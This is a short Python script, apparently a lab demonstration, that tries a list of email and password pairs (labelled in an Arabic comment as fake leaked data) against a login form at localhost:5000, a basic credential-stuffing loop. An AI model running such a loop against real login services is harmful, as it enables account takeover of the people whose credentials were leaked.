import requests

url = "http://localhost:5000/login"

# بيانات مسربة وهمية
leaked_data = [
    ("ahmed@gmail.com", "Ahmed@2021"),
    ("sara@yahoo.com", "Sara1234!"),
    ("admin@company.com", "Company@123"),
    ("user@hotmail.com", "P@ssw0rd"),
]

for username, password in leaked_data:
    requests.post(url, data={"username": username, "password": password})
    print(f"Tried: {username}")